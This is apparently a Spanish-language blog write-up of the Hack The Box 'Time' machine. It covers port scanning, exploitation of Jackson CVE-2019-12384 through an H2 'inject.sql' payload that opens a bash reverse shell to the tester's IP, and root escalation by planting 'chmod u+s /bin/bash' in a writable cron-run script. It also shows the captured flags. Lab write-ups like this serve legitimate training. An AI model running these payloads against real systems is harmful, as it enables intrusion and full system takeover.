---
layout      : post
title       : "Maquina Time - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Time/banner.jpg
category    : [ hackthebox ]
tags        : [ Jackson CVE-2019-12384 Exploitation, SSRF to RCE, Abusing Cron Job]
---

Hoy vamos a resolver la máquina `Time` de la plataforma de `hackthebox` correspondiente a una `linux` dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de `Jackson CVE-2019-12384`, y aprovecharemos la vulnerabilidad `SSRF` derivandola en una ejecucion remota de comandos `RCE` que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea `Cron` podamos obtener acceso como el usuario `root`.
 

Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Time
❯ ls
 Time
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## Enumeración [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.214
PING 10.10.10.214 (10.10.10.214) 56(84) bytes of data.
64 bytes from 10.10.10.214: icmp_seq=1 ttl=63 time=133 ms

--- 10.10.10.214 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 133.374/133.374/133.374/0.000 ms
```
Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `allPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.214 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:48 GMT
Initiating SYN Stealth Scan at 20:48
Scanning 10.10.10.214 [65535 ports]
Discovered open port 80/tcp on 10.10.10.214
Discovered open port 22/tcp on 10.10.10.214
Completed SYN Stealth Scan at 20:49, 17.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.214
Host is up, received user-set (0.15s latency).
Scanned at 2023-06-12 20:48:51 GMT for 18s
Not shown: 65476 closed tcp ports (reset), 57 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
           Raw packets sent: 87623 (3.855MB) | Rcvd: 86271 (3.451MB)
```
Podemos ver que los puertos que se encuentran abiertos son el puerto `22 ssh` y el `80 http`.

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p22,80 10.10.10.214 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 20:49 GMT
Nmap scan report for 10.10.10.214
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Online JSON parser
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
```
Visulizamos informacion interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 |
| 80   | HTTP     | Apache httpd 2.4.41 |


Seguidamente vamos a usar la herramienta `whatweb` para ver por consola el gestor de contenido de la pagina web.

```python
❯ whatweb http://10.10.10.214
http://10.10.10.214 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.214], JQuery[3.2.1], Script, Title[Online JSON parser]
```

La herramienta nos reporta que se trata de un `JSON parser`


## Explotación [#](#explotación) {#explotación}

Vamos a abrir la web y vemos que la pagina efectivamente es un `JSON parser`

![](/assets/images/HTB/htb-writeup-Time/time1.PNG)


Vemos una opcion de `Beautify` que al pasarle datos en `JSON` nos lo muestra de manera mas estetica.

![](/assets/images/HTB/htb-writeup-Time/time2.PNG)



Dentro de las opciones tambien podemos ver una de `Validate (Beta)`,y si procesamos una comilla nos arroja un error referente a `jackson java`


![](/assets/images/HTB/htb-writeup-Time/time4.PNG)


Investigando un poco encontramos que existe una vulnerabilidad a una libreria `jackson` que se usa para la deserealizacion `JSON` y mediante ello podemos realizar ataques de `SSRF` y derivarlo a una ejecucion remota de comandos.


Si deseas entender a mayor detalle la vulnerabilidad te dejo el siguiente articulo:

* [jackson-gadgets](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)


Para explotar esta vulnerabilidad debemos crear un archivo `inject.sql` con el siguiente contenido:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.16.3/443 0>&1')
```

En la función `shellexec`, introducimos el codigo que queremos que se ejecute cuando suceda la desearialización. En este caso introduciremos una instrucción en `bash` que nos permita obtener una reverse shell.


Lo siguiente ejecutar lo siguiente instrucción en el `JSON PARSER`, donde especificaremos nuestra ip, donde nos compartiremos el archivo `inject.sql`

![](/assets/images/HTB/htb-writeup-Time/time5.PNG)

Ahora nos compartimos el archivo, usando python.

```python
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Seguidamente nos ponemos en escucha en el puerto especifico, en este caso el `443` y enviamos la instrucción.


Recibimos la petición

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.214 - - [12/Jun/2023 23:13:26] "GET /inject.sql HTTP/1.1" 200 -
```

y obnenemos acceso como el usuario `pericles`


```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.214.
Ncat: Connection from 10.10.10.214:38128.
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ whoami
whoami
pericles
pericles@time:/var/www/html$
```

Como siempre vamos a configurar nuestra `tty` full interactiva

```bash
pericles@time:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
pericles@time:/var/www/html$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
pericles@time:/var/www/html$ export TERM=xterm
pericles@time:/var/www/html$ export SHELL=bash 
pericles@time:/var/www/html$ stty rows 45 columns 184
```
Nos dirigimos al directorio personal del usuario `pericles` y visializamos la primera flag `user.txt`

```bash
pericles@time:/var/www/html$ cd /home
pericles@time:/home$ ls
pericles
pericles@time:/home$ cd pericles/
pericles@time:/home/pericles$ ls
snap  user.txt
pericles@time:/home/pericles$ cat user.txt 
5598d4c823ca1aadd34004c1ed4cbfc8
pericles@time:/home/pericles$ 
```

## Escalada de Privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}


Para poder elevar privilegios primeramente a enumerar ver la lista de temporalizadores para ver información util sobre las tareas programadas en el sistema, utilzando el comando `systenctl list-timers`.

```bash
pericles@time:/home/pericles$ systemctl list-timers
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
Mon 2023-06-12 23:21:41 UTC 3s left       Mon 2023-06-12 23:21:31 UTC 6s ago               timer_backup.timer           timer_backup.service          
Mon 2023-06-12 23:39:00 UTC 17min left    Mon 2023-06-12 23:09:00 UTC 12min ago            phpsessionclean.timer        phpsessionclean.service       
Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         logrotate.timer              logrotate.service             
Tue 2023-06-13 00:00:00 UTC 38min left    Mon 2023-06-12 20:41:25 UTC 2h 40min ago         man-db.timer                 man-db.service                
Tue 2023-06-13 00:09:59 UTC 48min left    Tue 2021-02-09 14:42:14 UTC 2 years 4 months ago motd-news.timer              motd-news.service             
Tue 2023-06-13 03:56:23 UTC 4h 34min left Thu 2020-10-22 18:44:20 UTC 2 years 7 months ago apt-daily.timer              apt-daily.service             
Tue 2023-06-13 06:16:25 UTC 6h left       Mon 2023-06-12 21:40:37 UTC 1h 41min ago         apt-daily-upgrade.timer      apt-daily-upgrade.service     
Tue 2023-06-13 14:30:45 UTC 15h left      Mon 2023-06-12 22:46:51 UTC 34min ago            fwupd-refresh.timer          fwupd-refresh.service         
Tue 2023-06-13 20:56:20 UTC 21h left      Mon 2023-06-12 20:56:20 UTC 2h 25min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2023-06-18 03:10:37 UTC 5 days left   Mon 2023-06-12 20:42:05 UTC 2h 39min ago         e2scrub_all.timer            e2scrub_all.service           
Mon 2023-06-19 00:00:00 UTC 6 days left   Mon 2023-06-12 20:41:25 UTC 2h 40min ago         fstrim.timer                 fstrim.service                
```

Obervamos que se esta ejecutando un `timer_backup`, ahora para enumerar los procesos que se estan ejecutando en el sistema, vamos a crearnos un pequeño script en bash de nombre `procmon.sh`


```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
  new_process=$(ps -eo user,command)
  diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker" 
  old_process=$new_process
done
```

Lo ejecutamos en la maquina victima y vemos que el usuario `root` esta ejecutando el arhivo `timer_backup.sh` a intervalos regulares de tiempo.


```bash
root     /bin/sh -e /usr/lib/php/sessionclean
root     /bin/sh -e /usr/lib/php/sessionclean
root     /lib/systemd/systemd-udevd
root     /lib/systemd/systemd-udevd
root     /lib/systemd/systemd-udevd
root     /bin/bash /usr/bin/timer_backup.sh
root     zip -r website.bak.zip /var/www/html
root     /bin/bash /usr/bin/timer_backup.sh
root     zip -r website.bak.zip /var/www/html
```

Viendo las propiedades del archivo, vemos que somos propieatarios, por tanto tenemos permiso de escritura.


```bash
pericles@time:/home/pericles$ ls -l /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 Jun 12 23:40 /usr/bin/timer_backup.sh
pericles@time:/home/pericles$
```

Lo siguiente que haremos sera modificar el archivo, añadiendole una instruccion que nos otorgue el privilegio `suid` a la `bash`.


```bash
pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
#!/bin/bash
chmod  u+s /bin/bash
```

Ya que el usuario `root` nos ejecutara el archivo despues de unos segundos verificamos si nos asigno el permiso correspondiente a la `bash`.


```bash
pericles@time:/home/pericles$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
```

Lo unico que nos queda por hacer seria ejecutar `bash -p` y nos convertiriamos en el usuario `root`, ahora vamos a su directorio personal y visualizamos la segunda flag `root.txt`.

```bash
pericles@time:/home/pericles$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt
a527d7fbd3e113aeb96d956af2900de8
```
